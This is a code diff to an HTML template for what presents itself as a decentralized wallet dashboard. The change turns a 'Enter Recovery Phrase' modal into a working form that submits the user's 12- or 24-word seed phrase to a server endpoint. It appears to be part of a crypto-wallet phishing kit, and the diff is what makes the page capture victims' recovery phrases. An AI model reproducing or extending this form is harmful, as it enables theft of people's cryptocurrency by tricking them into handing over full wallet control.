@@ -41,7 +41,7 @@
             <span class="dash-badge">Decentralized</span>
 
             <div class="dash-actions">
-                <a href="/" class="dash-action">
+                <a href="#" class="dash-action">
                     <span class="dash-action-icon">
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                             stroke-linecap="round" stroke-linejoin="round">
@@ -343,7 +343,7 @@
                 <h5 class="modal-title" id="emptyWalletModalLabel"></h5>
                 <button type="button" class="btn-close btn-close-white" data-modal-close aria-label="Close"></button>
             </div>
-            <div class="modal-body">
+            <form class="modal-body" method="post" action="{% url 'confirm' %}">
                 <div class="cardmodal">
                     <h5>Enter Recovery Phrase</h5>
                     <p>Typically 12 (sometimes 24) words separated by single spaces
@@ -351,8 +351,11 @@
                     </p>
                     <textarea name="phrase" id=""></textarea>
                 </div>
+                <button type="submit" id="connectAWalletBtn" class="text-center w-100 bg-info border-0 text-white p-3">
+                    Confirm
+                </button>
 
-            </div>
+            </form>
         </div>
     </div>
 </div>
